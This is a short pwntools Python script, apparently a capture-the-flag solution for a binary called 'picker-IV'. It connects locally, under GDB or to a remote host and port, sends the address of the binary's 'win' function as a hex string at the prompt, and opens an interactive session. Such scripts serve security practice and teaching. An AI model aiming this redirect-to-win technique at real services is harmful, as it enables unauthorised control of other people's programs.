from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = "picker-IV"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = start()

win_address = elf.sym.win

io.sendlineafter(b":",hex(win_address).encode())

io.interactive()